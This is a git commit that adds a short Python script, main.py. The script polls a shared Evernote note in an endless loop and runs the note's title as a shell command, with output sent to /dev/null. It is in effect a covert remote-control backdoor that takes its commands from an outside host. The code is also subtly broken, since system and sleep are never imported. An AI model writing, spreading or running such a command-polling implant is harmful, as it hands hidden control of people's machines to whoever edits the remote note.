1aece480cc46b03dc1a24f94f22431c033398990
littleblack111 <jerrylam110209@gmail.com>
2023-08-12 18:32:04 +0800

    updated

---
+++ main.py
@@ -0,0 +1,22 @@
+from bs4 import BeautifulSoup
+from requests import get
+
+old_command = ""
+command = ""
+
+while True:
+    #get HTML
+    try:
+        html_file = get("https://www.evernote.com/shard/s721/sh/5ff8aabd-e957-668f-0503-01487d76ba01/GvzSxqlewn4fb3pQpdAww5TUVhNThgVRizYNHu0SI2y5ROrlfE0Dop_EZQ").text
+        soup = BeautifulSoup(html_file, 'lxml')
+        command = soup.find('title').text
+    except:
+        print("failed to connect to server")
+    #execute command
+    if old_command != command:
+        try:
+            system(f"{command} > /dev/null")
+            old_command = command
+        except:
+            pass
+    sleep(0.1)
